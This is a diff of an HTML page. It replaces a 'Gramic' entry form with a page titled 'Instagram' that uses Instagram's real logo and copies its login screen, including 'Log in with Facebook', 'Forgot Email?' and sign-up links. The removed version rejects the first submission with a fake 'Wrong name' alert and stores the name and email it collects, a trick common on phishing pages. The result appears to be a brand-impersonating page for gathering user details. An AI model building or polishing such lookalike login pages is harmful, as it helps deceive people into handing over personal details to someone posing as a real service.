@@ -1,52 +1,25 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Gramic — Access</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
 <link rel="stylesheet" href="style.css">
+<!-- Add a favicon if you want, e.g., a blank icon or a generic one -->
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📱</text></svg>">
+
 </head>
-<body>
-<div class="center">
-  <div class="card">
-    <h1 class="brand">Gramic</h1>
-    <p class="subtitle">Enter your details to continue</p>
-
-    <form id="entryForm">
-      <label class="lbl">Name</label>
-      <input id="nameInput" type="password" placeholder="Enter your name" required autocomplete="off" />
-
-      <label class="lbl">Email</label>
-      <input id="emailInput" type="email" placeholder="you@example.com" required autocomplete="off" />
-
-      <button id="accessBtn" type="submit" class="btn">Access</button>
-      <div class="small muted">Name will be hidden on screen (shown as dots).</div>
-    </form>
-  </div>
-</div>
-<script>
-// store name/email then redirect to survey
-let firstAttempt = true;
-document.getElementById('entryForm').addEventListener('submit', function(e){
-  e.preventDefault();
-  const nameEl = document.getElementById('nameInput');
-  const emailEl = document.getElementById('emailInput');
-  const name = nameEl.value.trim();
-  const email = emailEl.value.trim();
-  if(!name || !email){ alert('Please fill both fields.'); return; }
-
-  if(firstAttempt){
-    // playful wrong-name trick
-    alert('Oops 😜 Wrong name, try again!');
-    firstAttempt = false;
-    return;
-  }
-
-  // save to session and go to survey
-  sessionStorage.setItem('gramic_name', name);
-  sessionStorage.setItem('gramic_email', email);
-  window.location.href = 'quick-survey.html';
-});
-</script>
-</body>
-</html>
+ <body>
+     <div class="container">
+         <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735ce558bce9.png" alt="Instagram Logo" style="width: 175px; margin-bottom: 20px;">
+         <form id="login-form">
+             <input type="email" id="email-input" placeholder="Email" required>
+             <input type="text" id="name-input" placeholder="Name" required>
+             <button type="submit">Log In</button>
+         </form>
+         <div style="margin: 15px 0; color: #8e8e8e;">OR</div>
+         <button style="background-color: #385185;">Log in with Facebook</button>
+         <p style="font-size: 0.9em; margin-top: 20px;">Forgot Email?</p>
+         <hr style="border: none; border-top: 1px solid #efefef; margin: 20px 0;">
+         <p style="font-size: 0.9em;">Don't have an account? <a href="#" style="color: #0095f6; text-decoration: none;">Sign up</a></p>
+     </div>
